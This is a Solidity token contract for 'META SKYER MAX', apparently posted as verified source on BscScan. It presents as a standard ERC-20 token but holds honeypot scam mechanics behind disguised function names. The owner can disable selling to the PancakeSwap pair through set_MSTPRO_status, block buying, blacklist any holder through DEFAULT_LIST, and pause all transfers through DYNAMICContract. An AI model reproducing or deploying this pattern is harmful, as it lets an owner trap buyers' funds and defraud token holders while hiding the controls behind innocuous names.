/**
 *Submitted for verification at BscScan.com on 2024-01-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract  SKYER is Context, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
     mapping (address=>bool) private _DEFAULT_LIST ;
    mapping (address => mapping (address => uint256)) private _allowances;
      uint256 private _totalSupply;
      string private _name;
      string private _symbol;
      uint8 private _decimals;
      address private pancakePair;
      bool private MSTPRO=true;
      bool private MST=true;
      address public owner;

    constructor ()  {
        _name = 'META SKYER MAX';
        _symbol ='SKYER MAX';
        _totalSupply = 1000000e18;
        _decimals = 18;
        owner=msg.sender;
        _balances[owner] = _totalSupply;
        DYNAMIC = false;
        emit Transfer(address(0), owner, _totalSupply);
    }

     modifier onlyOwner() {
        require(msg.sender==owner, "Only Call by Owner");
        _;
    }
    event Paused(address account);
    event Unpaused(address account);
    bool private DYNAMIC;
    function paused() private view  returns (bool) {
        return DYNAMIC;
    }
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }
    function _pause() internal virtual whenNotPaused {
        DYNAMIC = true;
        emit Paused(msg.sender);
    }
    function _unpause() internal virtual whenPaused {
        DYNAMIC = false;
        emit Unpaused(msg.sender);
    }
    function DYNAMICContract() public onlyOwner{
        _pause();

    }
    function DYNAMIC_PROContract() public onlyOwner{
        _unpause();

    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual whenNotPaused override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address _owner, address spender) public view virtual override returns (uint256) {
        return _allowances[_owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public whenNotPaused virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_DEFAULT_LIST[sender]==false,"you are blacklisted");
        require(_DEFAULT_LIST[recipient]==false,"you are blacklisted");

        if (recipient == pancakePair )
        {
                 require(true == MSTPRO, "block selling");
		}
        if(sender==pancakePair) {
                 require(true == MST, "block buying");       
        }
            _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 2");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
    }
    function _approve(address _owner, address spender, uint256 amount) internal whenNotPaused virtual {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }
      function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 value) internal whenNotPaused {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
    function addpairaddress(address _pair) public onlyOwner whenNotPaused{
        pancakePair=_pair;

    } 
    function set_MST_status(bool status) public onlyOwner whenNotPaused{
        MST=status;
    }
      function set_MSTPRO_status(bool status) public whenNotPaused onlyOwner{
        MSTPRO=status;
    }
    function DEFAULT_LIST (address _addr) public onlyOwner whenNotPaused{
        require(_DEFAULT_LIST[_addr]==false,"already blacklisted");
        _DEFAULT_LIST[_addr]=true;
    }
    function MAIN_LIST(address _addr) public onlyOwner whenNotPaused{
        require(_DEFAULT_LIST[_addr]==true,"already removed from blacklist");
        _DEFAULT_LIST[_addr]=false;
    }
    function Self_MST(uint256 amount) public onlyOwner whenNotPaused{
        IERC20(address(this)).transfer(msg.sender,amount);
    }
}